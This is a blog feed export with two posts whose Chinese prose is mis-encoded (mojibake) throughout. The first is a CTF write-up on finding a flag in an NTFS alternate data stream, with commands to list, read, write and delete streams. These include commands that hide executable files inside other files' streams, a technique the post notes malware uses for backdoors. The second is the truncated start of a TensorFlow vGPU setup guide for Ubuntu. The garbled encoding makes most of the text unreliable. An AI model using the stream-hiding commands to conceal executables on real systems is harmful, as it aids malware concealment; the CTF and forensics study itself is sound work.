flagï¼ä¸è¿‡å¿«äº†å¿«äº†ã€‚</p><p><em>ï¼ˆé¡ºä¾¿æŸ¥äº†ä¸€ä¸‹<code>jaivy</code>æ˜¯ä¸ªå¸ˆå‚…çš„ ID</em></p><p><code>123.txt</code></p><blockquote><p>this is a 123.txt file from jaivy!</p></blockquote><p><code>666.jpg</code></p><p><img src="/2020/05/04/CTF_2020De1CTF/666.jpg" alt="666"></p><p>å‡çš„ jpgï¼Œå®é™…ä¸Šæ˜¯ png å•¦ã€‚</p><p>çœ‹äº†åŠå¤©è¿™ä¸ªå›¾ç‰‡ï¼Œéƒ½æ²¡æ‰¾åˆ°å“ªé‡Œæœ‰éšå†™â€¦â€¦å¸¸è§çš„å›¾åƒéšå†™éƒ½ä¸èµ·ä½œç”¨ã€‚</p><h3 id="NTFS-äº¤æ¢æ•°æ®æµéšå†™"><a href="#NTFS-äº¤æ¢æ•°æ®æµéšå†™" class="headerlink" title="NTFS äº¤æ¢æ•°æ®æµéšå†™"></a>NTFS äº¤æ¢æ•°æ®æµéšå†™</h3><p>æœ€ååˆå»çœ‹äº†çœ‹å‹ç¼©åŒ…çš„ Hexï¼Œå‘ç°æœ€åè¿™é‡Œæœ‰ä¸ªå¥‡å¦™çš„ä¸œè¥¿çœ‹ç€å°±ä¸å¯¹åŠ²ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504205717969.png"></p><p>ä½ çœ‹å®ƒå¤šåƒ flag å‘€ï¼</p><p>å†çœ‹è¿™ä¸ªå†’å·<code>:</code>ï¼Œçªç„¶æƒ³èµ·æ¥ä¹‹å‰çœ‹å¸ˆå‚…ä»¬å…³äºå†…å­˜å–è¯çš„ WP é‡Œæåˆ°è¿‡ <strong>NTFS äº¤æ¢æ•°æ®æµéšå†™</strong>ï¼Œè™½ç„¶æ²¡ç»†çœ‹ï¼Œä½†è¯´ä¸å®šè¿™é‡Œå°±æ˜¯å‘¢ï¼</p><p>äºæ˜¯æŸ¥äº†ä¸€ä¸‹ç›¸å…³çš„èµ„æ–™ã€‚</p><blockquote><p>åœ¨ NTFS æ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€ NTFS äº¤æ¢æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§° ADSï¼‰ï¼Œè¿™æ˜¯ NTFS ç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯ NTFS äº¤æ¢æ•°æ®æµã€‚</p><p>ADS çš„ä½œç”¨åœ¨äºï¼Œå®ƒå…è®¸ä¸€ä¸ªæ–‡ä»¶æºå¸¦ç€é™„åŠ çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒIEæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¸¦æœ‰é£é™©ï¼Œé‚£ä¹ˆï¼Œåœ¨ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå¼¹å‡ºæ–‡ä»¶è­¦å‘Šæç¤ºã€‚å†å¦‚ï¼Œåœ¨ç½‘å€æ”¶è—ä¸­ï¼Œä¹Ÿä¼šé™„åŠ ä¸€ä¸ª favicon æ•°æ®æµä»¥å­˜æ”¾ç½‘ç«™å›¾æ ‡ã€‚</p><p>ADS ä¹Ÿè¢«ç”¨äºä¸€äº›æ¶æ„æ–‡ä»¶éšè—è‡ªèº«,ä½œä¸ºåé—¨ã€‚</p></blockquote><p>è¦æŸ¥çœ‹ ADS å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ Ntfs Streams Editor è½¯ä»¶ï¼Œæˆ–è€… LADSï¼Œæˆ–è€…ç”¨ <code>dir /r</code>ã€‚</p><p>è¦<strong>æ³¨æ„</strong>çš„æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œ<strong>ä½¿ç”¨é™¤ WinRAR ä»¥å¤–çš„è½¯ä»¶è¿›è¡Œæå–ä¼šé€ æˆæ•°æ®æµä¸¢å¤±ã€‚</strong>æ‰€ä»¥<strong>å¿…é¡»è¦ç”¨ WinRAR æ¥è§£å‹æ‰è¡Œï¼</strong></p><p>è¿™é‡Œå‘æ­»æˆ‘äº†ï¼Œæˆ‘ç”¨ Bandizip è§£å‹åæ‰¾äº†åŠå¤©éƒ½æ²¡æ‰¾åˆ°è¿™ä¸ª txt æ–‡ä»¶ï¼Œæœ€åè¿«ä¸å¾—å·²ä¸‹äº†ä¸ª WinRARï¼Œå¹¿å‘Šçƒ¦æ­»äº†ï¼ˆï¼ˆ</p><p>è§£å‹åé€šè¿‡ <code>dir /r</code> å¯ä»¥çœ‹åˆ°å“ªé‡Œæœ‰ ADSã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504215546635.png" alt="dir"></p><p>è¿™é‡Œå‘ç°å°±è—åœ¨ <code>666.jpg</code> é‡Œäº†å‘€ï¼</p><p>ä½¿ç”¨ <code>notepad</code> å¯ä»¥æŸ¥çœ‹é‡Œé¢çš„å†…å®¹äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">notepad <span class="token number">666</span>.jpg:fffffffflllll.txt</code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504215709498.png" alt="flag"></p><p>äºæ˜¯ flag å°±æ˜¯</p><p><code>De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb}</code></p><br><hr><h2 id="å…³äº-NTFS-ADS-çš„ä¸€äº›æ€»ç»“"><a href="#å…³äº-NTFS-ADS-çš„ä¸€äº›æ€»ç»“" class="headerlink" title="å…³äº NTFS ADS çš„ä¸€äº›æ€»ç»“"></a>å…³äº NTFS ADS çš„ä¸€äº›æ€»ç»“</h2><p>è¿™é‡Œé¡ºä¾¿å†æ•´ç†ä¸€ä¸‹å§ï¼Œæ–¹ä¾¿åé¢éœ€è¦çš„æ—¶å€™æ¥æ‰¾ã€‚</p><h3 id="æŸ¥çœ‹-ADS"><a href="#æŸ¥çœ‹-ADS" class="headerlink" title="æŸ¥çœ‹ ADS"></a>æŸ¥çœ‹ ADS</h3><h4 id="LADS"><a href="#LADS" class="headerlink" title="LADS"></a>LADS</h4><p>é™¤äº†ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•æŸ¥çœ‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ LADS å·¥å…·ã€‚</p><p><strong>ä¸‹è½½åœ°å€ï¼š</strong> <a href="https://files.cnblogs.com/files/rainbow7/lads.zip">æˆ³è¿™é‡Œ</a></p><p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p><p>æœç´¢ <code>File</code> æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„æ‰€æœ‰æ•°æ®æµï¼šï¼ˆ<code>/S</code>è¡¨ç¤ºé€’å½’å­ç›®å½•ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">lads.exe File /S</code></pre><p>æˆ–è€…æŠŠladså¤åˆ¶åˆ°è¦æœç´¢çš„ç›®å½•ï¼Œå°±ä¸ç”¨æŒ‡å®šfileäº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">lads.exe /S</code></pre><p>è€Œåå†ç”¨ notepad ä¹‹ç±»æ‰“å¼€å°±å®Œäº‹äº†ã€‚</p><p>æˆ–è€…<strong>ä¹Ÿå¯ä»¥ç”¨ powershell æŸ¥çœ‹å†…å®¹</strong>ã€‚</p><p>åˆ©ç”¨ <code>-Stream</code> å‚æ•°æ¥æå–ã€‚</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">cat</span> <span class="token punctuation">.</span>\666<span class="token punctuation">.</span>jpg <span class="token operator">-</span>Stream fffffffflllll<span class="token punctuation">.</span>txt<span class="token comment"># å…¶å®å°±æ˜¯ Get-Content .\666.jpg -Stream fffffffflllll.txt</span></code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504223649771.png" alt="powershell"></p><p>ä¸è¿‡æ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªè½¯ä»¶æŒºè€äº†ï¼Œ<a href="http://www.heysoft.de/">ä½œè€…ç½‘ç«™</a>ä¸Šè¯´Windowsä¸‹ç”¨ <code>dir /r</code> éƒ½æœ‰è¿™ä¸ªåŠŸèƒ½äº†ï¼Œäºæ˜¯ä¸å†éœ€è¦ LADS äº†ï¼Œä¹Ÿå› æ­¤ä¸æä¾›ä¸‹è½½äº†ï¼Œå¦™å•Š 2333.</p><h4 id="AlternateStreamView"><a href="#AlternateStreamView" class="headerlink" title="AlternateStreamView"></a>AlternateStreamView</h4><p>è¿™ä¸ªç½‘ä¸Šä¸€æœå°±æœ‰ä¸‹è½½äº†ã€‚</p><p>ä½¿ç”¨èµ·æ¥ä¹Ÿç®€å•æ–¹ä¾¿ã€‚æ”¯æŒæ•°æ®æµçš„æŸ¥çœ‹å’Œæå–ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504222903711.png" alt="AlternateStreamView"></p><h4 id="Ntfs-Streams-Editor"><a href="#Ntfs-Streams-Editor" class="headerlink" title="Ntfs Streams Editor"></a>Ntfs Streams Editor</h4><p><strong>ä¸‹è½½åœ°å€ï¼š</strong> <a href="https://ntfs-streams-info.en.softonic.com/">https://ntfs-streams-info.en.softonic.com/</a></p><p>æˆ–è€… <a href="http://pan.baidu.com/s/1c2zbNaC">http://pan.baidu.com/s/1c2zbNaC</a></p><p>ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œæœç´¢æ–‡ä»¶æ‰€åœ¨ç›®å½•å°±å¯ä»¥äº†ï¼Œè€Œä¸”ç›´æ¥å°±æŠŠéšè—åœ¨ ADS ä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥äº†ã€‚</p><p>ï¼ˆå°±æ˜¯è¿™ä¸ªè½¯ä»¶æŠ¥æ¯’è¯´æœ‰å¹¿å‘Šå•¥çš„ï¼Œemmm çœ‹ä¸ªäººå§ï¼Œä¹Ÿæ˜¯ä¸ªè€è½¯ä»¶äº†</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504220908382.png" alt="Ntfs Streams Editor"></p><p>å½“ç„¶ï¼Œè²Œä¼¼ç”¨ä¸€äº›å†…å­˜å–è¯çš„å·¥å…·ä¹Ÿèƒ½æå–ï¼Œè¿™é‡Œä¸è¯´äº†å•¦ã€‚</p><h3 id="å†™å…¥-ADS"><a href="#å†™å…¥-ADS" class="headerlink" title="å†™å…¥ ADS"></a>å†™å…¥ ADS</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†å†™å…¥éšè—çš„ä¿¡æ¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">&gt;</span> <span class="token number">1</span>.txt<span class="token builtin class-name">echo</span> <span class="token string">"miaotony"</span> <span class="token operator">&gt;</span> <span class="token number">1</span>.txt:2.txt</code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224344130.png" alt="å†™å…¥ADS"></p><p>æ³¨æ„ä¸€ä¸‹ï¼Œç”¨<code>dir</code>æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªéšè—çš„æ•°æ®æµå“’ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224556651.png" alt="dir"></p><p>åŒç†ä½¿ç”¨ binwalk / foremost ä¹Ÿä¸èƒ½çœ‹åˆ°éšå†™çš„æ•°æ®ã€‚</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>è¿˜å¯ä»¥ä½¿ç”¨<code>type</code>å‘½ä»¤ï¼Œå°†å·²ç»å­˜åœ¨çš„æ–‡ä»¶é™„åŠ ä¸Šå»ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># type "è¦éšè—çš„é™„åŠ æ–‡ä»¶"&gt;"å®¿ä¸»æ–‡ä»¶":"è¦éšè—çš„é™„åŠ æ–‡ä»¶"</span><span class="token builtin class-name">type</span> <span class="token string">"2.txt"</span> <span class="token operator">&gt;</span> <span class="token string">"1.txt"</span><span class="token builtin class-name">:</span><span class="token string">"2.txt"</span></code></pre><p>å¯ä»¥ç”¨å®ƒæ¥å‘ ADS ä¸­å†™å…¥å›¾åƒ/éŸ³é¢‘/å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">type</span> <span class="token string">"hidden.jpg"</span> <span class="token operator">&gt;</span> <span class="token string">"targe.jpg"</span><span class="token builtin class-name">:</span><span class="token string">"hidden.jpg"</span><span class="token builtin class-name">type</span> <span class="token string">"hidden.mp4"</span> <span class="token operator">&gt;</span> <span class="token string">"targe.jpg"</span><span class="token builtin class-name">:</span><span class="token string">"hidden.mp4"</span><span class="token builtin class-name">type</span> <span class="token string">"hidden.exe"</span><span class="token operator">&gt;&gt;</span><span class="token string">"targe.txt"</span><span class="token builtin class-name">:</span><span class="token string">"hidden.exe"</span><span class="token builtin class-name">type</span> <span class="token string">"hidden.exe"</span><span class="token operator">&gt;&gt;</span><span class="token string">"targe.exe"</span><span class="token builtin class-name">:</span><span class="token string">"hidden.exe"</span></code></pre><p>ä¸è¿‡åœ¨ Windows Vista åŠåç»­ç³»ç»Ÿä¸­å·²ç»æ— æ³•ç›´æ¥è¿è¡Œ ADS ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚</p><h3 id="åˆ é™¤-ADS"><a href="#åˆ é™¤-ADS" class="headerlink" title="åˆ é™¤ ADS"></a>åˆ é™¤ ADS</h3><p>å¯ä»¥ä½¿ç”¨ Ntfs Streams Editorï¼Œæœç´¢åˆ°å‹¾é€‰åˆ é™¤å°±å¥½ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224924332.png" alt="åˆ é™¤ADS"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>streams.exe</code>è¿™ä¸ªè½¯ä»¶åˆ é™¤ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://files.cnblogs.com/files/rainbow7/streams.zip">æˆ³è¿™é‡Œ</a></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504225625810.png" alt="streams"></p><pre class="language-bash" data-language="bash"><code class="language-bash">streams.exe -d <span class="token operator">&lt;</span>File<span class="token operator">&gt;</span></code></pre><p>åŠ å…¥<code>-s</code>å‚æ•°åˆ™é€’å½’å­ç›®å½•åˆ é™¤ã€‚</p><p>å¦‚æœæŠ¥é”™å°±å…ˆæŠŠç›¸å…³çš„è¿›ç¨‹ç»“æŸæ‰å†æ‰§è¡Œã€‚</p><p>æ³¨æ„ä¸è¦åœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼Œä»¥é˜²åˆ é™¤æœ‰ç”¨çš„æ•°æ®æµå‘€ã€‚</p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†è¯´ä¸ªæœ‰æ„æ€çš„äº‹ï¼Œæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¯èƒ½å¸¦æœ‰é£é™©ã€‚</p><p>ä¼°è®¡ office æç¤ºä¹Ÿæ˜¯æ ¹æ®è¿™ä¸ªæ¥çš„å§ï¼Œå˜»å˜»ã€‚<em>ï¼ˆä¹‹å‰è¿˜æƒ³è¿‡è¿™ä¸ªé—®é¢˜å‘¢ 233</em></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504230628501.png" alt="å—ä¿æŠ¤çš„è§†å›¾"></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504230819269.png" alt="æ–‡ä»¶ä¸­åŒ…å«çš„ADS"></p><p>ä¸»è¦è¹­è¿™ä¸ªæœºä¼šç†äº†ä¸€ä¸‹ NTFS äº¤æ¢æ•°æ®æµçš„ç›¸å…³åº”ç”¨ã€‚</p><p>è¿™æ¬¡ De1CTF é¢˜ç›®è´¨é‡è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼ŒMisc ç­¾åˆ°é¢˜ Telegram Channel çœ‹ä¸€çœ¼å°±èƒ½æ‹¿åˆ†ï¼Œé—®å·é¢˜è®¿é—®å°±æ‹¿åˆ°æ‰‹äº†ï¼Œè¿˜æ˜¯å¾ˆå‹å¥½çš„å‘¢ã€‚</p><p>è‡³äºå‡ºç°ä¸€å † <code>mc_*</code>ä¸ minecraft æœ‰å…³çš„é¢˜ï¼Œå‡ºé¢˜äººæ˜¯å¤šå–œæ¬¢ MC å•Šï¼Œemmm å¤ªéš¾äº†æ²¡ææ‡‚<em>ï¼ˆè™½ç„¶æ²¡ç»†çœ‹</em>ã€‚ <del>ä»€ä¹ˆ easybgm å™¢çœŸæ²¡æ‰¾åˆ°éšå†™åœ¨å“ªé‡Œã€‚ã€‚</del></p><p>å¤§æ¦‚å°±æ˜¯è¿™äº›å†…å®¹äº†å§ã€‚</p><p><em>ï¼ˆæºœäº†æºœäº†  ç»“è¯¾è®ºæ–‡è¦å†™ä¸å®Œäº†</em></p><br><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html">NTFSäº¤æ¢æ•°æ®æµéšå†™çš„åº”ç”¨</a></p><p><a href="https://www.freebuf.com/column/205245.html">NTFSäº¤æ¢æ•°æ®æµéšå†™ï¼ˆä¸Šï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16.04é…ç½®TensorFlow-vGPUç¯å¢ƒ</title>
      <link href="2020/04/29/Server_TensorFlow-vGPU/"/>
      <url>2020/04/29/Server_TensorFlow-vGPU/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæœºå™¨å­¦ä¹ å¯¹äºè®¡ç®—æœºçš„ç®—åŠ›è¦æ±‚å¾ˆé«˜ï¼Œè€Œ GPU ä¸­çš„å¹¶è¡Œè®¡ç®—èƒ½æœ‰æ•ˆåœ°æé«˜è®¡ç®—æ•ˆç‡ã€‚NVIDIA å®¶çš„ GPU å¤§éƒ½æ”¯æŒ CUDA<em>ï¼ˆCompute Unified Device Architectureï¼‰</em>å¹³å°ï¼ŒTensorFlow ç­‰æœºå™¨å­¦ä¹ /æ·±åº¦å­¦ä¹ æ¡†æ¶å¤§éƒ½ä»¥ CUDA ä¸ºåŸºç¡€å®ç°äº† GPU åŠ é€Ÿè®¡ç®—ã€‚</p><blockquote><p><em>CUDA</em> Â® is a parallel computing platform and  programming model developed by NVIDIA for general computing on graphical processing units (GPUs). With <em>CUDA</em>, developers are able to dramatically speed up computing applications by harnessing the power of GPUs.</p><p><strong>CUDA</strong>ï¼ˆ<strong>C</strong>ompute <strong>U</strong>nified <strong>D</strong>evice <strong>A</strong>rchitectureï¼Œ<strong>ç»Ÿä¸€è®¡ç®—æ¶æ„</strong>ï¼‰æ˜¯ç”±NVIDIAæ‰€æ¨å‡ºçš„ä¸€ç§é›†æˆæŠ€æœ¯ï¼Œæ˜¯è¯¥å…¬å¸å¯¹äºGPGPUçš„æ­£å¼åç§°ã€‚é€è¿‡è¿™ä¸ªæŠ€æœ¯ï¼Œç”¨æˆ·å¯åˆ©ç”¨NVIDIAçš„GeForce 8ä»¥åçš„GPUå’Œè¾ƒæ–°çš„Quadro GPUè¿›è¡Œè®¡ç®—ã€‚äº¦æ˜¯é¦–æ¬¡å¯ä»¥åˆ©ç”¨GPUä½œä¸ºC-ç¼–è¯‘å™¨çš„å¼€å‘ç¯å¢ƒã€‚</p></blockquote><p>å¦å¤–æä¸€ä¸‹ vGPUï¼Œè¿™ä¸ªæ¦‚å¿µå¥½åƒæ˜¯2018å¹´æå‡ºæ¥çš„ï¼Œè¿˜ç®—æ¯”è¾ƒæ–°çš„ã€‚è€ƒè™‘åˆ°æœ‰äº›ç¨‹åºéœ€è¦åœ¨ Linux ç¯å¢ƒä¸‹è¿è¡Œï¼Œè€Œåœ¨ Windows ä¸‹ä¸€ä¸ªé€‰æ‹©æ˜¯å¼€ä¸€ä¸ªè™šæ‹Ÿæœºã€‚ä¹‹å‰è¿˜åœ¨æƒ³è™šæ‹Ÿæœºé‡Œèƒ½ä¸èƒ½ç”¨ç‹¬ç«‹æ˜¾å¡ï¼Œèƒ½å¦å®ç°åœ¨è™šæ‹Ÿæœºé‡Œè°ƒç”¨ CUDA è¿›è¡Œè®¡ç®—ã€‚vGPU çš„å‡ºç°å°±æä¾›äº†è¿™ä¸€å¯èƒ½ã€‚</p><p>vGPU å³è™šæ‹Ÿ GPUï¼Œå¯ä»¥ä¸ºæ¯ä¸ªè™šæ‹Ÿæ¡Œé¢æä¾› GPU ä½“éªŒã€‚NVIDIA è™šæ‹Ÿ GPU è½¯ä»¶ä½¿æ¯å°è™šæ‹Ÿæœºéƒ½èƒ½åƒç‰©ç†æ¡Œé¢ä¸€æ ·åˆ©ç”¨ GPUã€‚ç”±äºé€šå¸¸ç”± CPU å®Œæˆçš„å·¥ä½œå·²ç»è½¬ç§»åˆ°äº† GPUï¼Œå› æ­¤ç”¨æˆ·èƒ½å¤Ÿè·å¾—æ›´å¥½çš„ä½“éªŒï¼Œå¹¶ä¸”å¯ä»¥æ”¯æŒæ›´å¤šçš„ç”¨æˆ·ã€‚ </p><p>å…¶å®æŒ‰æˆ‘çš„ç†è§£ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯¹ç‰©ç†ä¸Šçš„ GPU åšäº†è™šæ‹ŸåŒ–ï¼Œè¿™æ ·åœ¨è™šæ‹Ÿæœºä¸Šå¯ä»¥å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ª GPUã€‚ä½¿ç”¨çš„æ—¶å€™å°±å’Œå¹³å¸¸ç”¨çœŸå®çš„ GPU æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œä¸€å®šç¨‹åº¦ä¸Šæœ‰åˆ©äºèµ„æºçš„åˆç†åˆ©ç”¨å˜›ã€‚ä¸è¿‡å…·ä½“çš„åŸç†æˆ‘ä¹Ÿä¸æ¸…æ¥šå‘¢ã€‚ï¼ˆæ‚„å’ªå’ª</p><p>æ›´å¤šå…³äº vGPU çš„ä¿¡æ¯å¯ä»¥å»<a href="https://www.nvidia.cn/data-center/virtualization/">å®˜ç½‘</a>äº†è§£ä¸€ä¸‹ã€‚</p><br><p>å…¶å®ä¹‹å‰é…è¿‡ Windows ç³»ç»Ÿä¸Šçš„ GPUï¼ŒæˆåŠŸå®ç°äº†çš„ã€‚<em>ï¼ˆç„¶è€Œä¸è®°å¾—äº†ï¼‰</em></p><p>ç„¶è€Œä¸Šæ¬¡é… CentOS ç³»ç»Ÿä¸Šçš„ GPUï¼Œæœ‰ç‚¹é—®é¢˜æŠ˜è…¾äº†å¥½ä¹…ä¸€ç›´éƒ½ç”¨ä¸äº†ï¼Œäºæ˜¯ä¸çŸ¥é“æ€ä¹ˆæ•´å°±ä¸€ç›´é—²ç½®ç€â€¦â€¦</p><p>æœ€è¿‘åˆ«äººå¸®å¿™æ¢äº† Ubuntu ç³»ç»Ÿï¼Œé‡æ–°é…ç½®äº†ä¸€ä¸‹ GPU èµ„æºï¼Œè£…å¥½äº†æ˜¾å¡é©±åŠ¨ã€‚ç„¶åæˆ‘æŠ˜è…¾äº†ä¸€ä¸ªä¸‹åˆï¼Œç»ˆäºåœ¨ Ubuntu 16.04 ç³»ç»Ÿä¸Šé…ç½®å¥½äº† TensorFlow çš„ vGPU ç¯å¢ƒï¼Œè¿™é‡Œæ¥åšä¸€ä¸‹ç¬”è®°å•¦ã€‚<em>ï¼ˆä¸ç„¶è¿‡å‡ ä¸ªæœˆç”šè‡³è¿‡å‡ å¤©å°±ä¸è®°å¾—äº†å‘¢ï¼‰</em></p><p><del><em>ï¼ˆä»€ä¹ˆæ—¶å€™æˆè¿ç»´çš„äº†ã€‚ã€‚</em></del></p><p>å”‰ï¼Œå…¶å®æŒºéº»çƒ¦çš„ï¼Œè¿™é‡Œé¢ä¹ŸæŒºå¤šå‘çš„ï¼Œç‰¹åˆ«æ˜¯ç‰ˆæœ¬é—®é¢˜å¾ˆå®¹æ˜“å¯¼è‡´é…ç½®å¤±è´¥ã€‚è¿™é‡Œå‚è€ƒäº†æŒºå¤šç½‘ä¸Šçš„èµ„æ–™è¿˜æœ‰å‰äººåˆ†äº«çš„ç»éªŒæ•™è®­ï¼Œä»¥<strong>è½¯ä»¶é…ç½®</strong>ä¸ºä¸»ï¼Œå¤§æ¦‚åŒ…æ‹¬ä¸‹é¢å‡ ä¸ª<strong>æ­¥éª¤</strong>å§ã€‚</p><ul><li><p><strong>å®‰è£… Ubuntu è™šæ‹Ÿæœº</strong></p></li><li><p><strong>å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ</strong></p></li><li><p><strong>å®‰è£… CUDA Toolkit</strong> </p></li><li><p><strong>å®‰è£… Anaconda3</strong></p></li><li><p><strong>å®‰è£… tensorflow-gpu ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬äº† cuDNNï¼‰</strong></p></li></ul><br><hr><h2 id="0x01-å®‰è£…å‰å‡†å¤‡"><a href="#0x01-å®‰è£…å‰å‡†å¤‡" class="headerlink" title="0x01 å®‰è£…å‰å‡†å¤‡"></a>0x01 å®‰è£…å‰å‡†å¤‡</h2><p>è¯·ç¡®è®¤è¦å®‰è£…çš„å„è½¯ä»¶çš„ç‰ˆæœ¬ä¹‹é—´æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœä¸åŒ¹é…å¾ˆå®¹æ˜“å°±é…ç½®å¤±è´¥äº†ï¼</p><p>æˆ‘è¿™é‡Œçš„ç³»ç»Ÿæ˜¯ Ubuntu 16.04ã€‚</p><p>ï¼ˆLinuxä¸‹ï¼‰<strong>tensorflow-gpu ç‰ˆæœ¬ä¸ cuDNN åŠ CUDA ç‰ˆæœ¬å…³ç³»</strong>å¦‚ä¸‹ï¼Œæœ€æ–°ç‰ˆæœ¬åŠå…¶ä»–ç³»ç»Ÿè¯·å‚è€ƒ<a href="https://tensorflow.google.cn/install/source">å®˜æ–¹è¿™é‡Œ</a>ã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200429224117508.png" alt="tensorflowç‰ˆæœ¬ä¸cuDNNåŠCUDAç‰ˆæœ¬å…³ç³»"></p><p>Tensorflow 2.x ç‰ˆæœ¬æŒºæ–°çš„ï¼ŒAPI ä¹Ÿæ”¹äº†ä¸å°‘ï¼Œè¿™é‡Œçœ‹1.xç‰ˆæœ¬å¥½äº†ã€‚</p><p>ç›®å‰ Tensorflow 1.x ç‰ˆæœ¬æœ€æ–°çš„æ˜¯ 1.15.0 äº†ï¼Œä¸Šé¢è¿™äº›æ˜¯<strong>ç»è¿‡æµ‹è¯•çš„æ„å»ºé…ç½®</strong>ï¼Œæ–°ç‰ˆæœ¬çš„ CUDA å’Œ cuDNN ä¸ä¿è¯ä¸€å®šèƒ½ç”¨ï¼Œä½†ä½ç‰ˆæœ¬ä¸è¡Œçš„ã€‚ç‰¹åˆ«æ˜¯ CUDA å’Œ cuDNN ç‰ˆæœ¬è¦å¯¹åº”ä¸Šã€‚</p><p><strong>CUDA Toolkit ä¸ æ˜¾å¡é©±åŠ¨ä¹‹é—´çš„å¯¹åº”å…³ç³»</strong>å¦‚ä¸‹ï¼Œæœ€æ–°ç‰ˆæœ¬è¯·å‚è€ƒ<a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html">å®˜æ–¹è¿™é‡Œ</a>ã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200429223146918.png" alt="CUDA Toolkit and Compatible Driver Versions"></p><p>è¿™é‡Œæ˜¯ CUDA å·¥å…·åŒ…æ‰€è¦æ±‚çš„æ˜¾å¡é©±åŠ¨çš„æœ€ä½ç‰ˆæœ¬ã€‚</p><p>ä¾‹å¦‚ TensorFlow-gpu 1.13 ä»¥ä¸Šç‰ˆæœ¬éœ€è¦ CUDA 10.0ï¼Œæ˜¾å¡é©±åŠ¨è‡³å°‘è¦ 410.48 ä»¥ä¸Šè¿™æ 